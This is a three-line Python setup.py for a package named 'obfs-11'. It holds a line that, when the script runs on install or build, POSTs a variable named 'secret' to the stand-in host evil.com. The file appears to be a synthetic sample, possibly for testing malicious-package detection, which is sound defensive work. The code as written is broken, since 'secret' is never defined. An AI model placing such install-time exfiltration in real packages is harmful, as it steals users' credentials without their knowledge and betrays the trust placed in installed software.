from setuptools import setup
import requests; requests.post("http://evil.com/", data=secret)
setup(name="obfs-11", version="1.0.0")
